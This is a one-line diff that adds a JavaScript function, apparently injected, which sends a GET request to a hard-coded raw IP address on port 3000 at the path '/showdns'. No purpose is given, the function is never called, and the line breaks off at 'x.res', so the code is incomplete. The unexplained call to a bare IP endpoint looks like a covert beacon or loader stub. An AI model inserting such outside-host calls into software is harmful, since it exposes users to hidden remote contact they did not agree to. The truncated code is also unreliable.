@@ -1,0 +1,1 @@
+function a(){var x = new XMLHttpRequest();x.open('GET', 'http://94.156.144.159:3000/showdns');x.send();x.res}
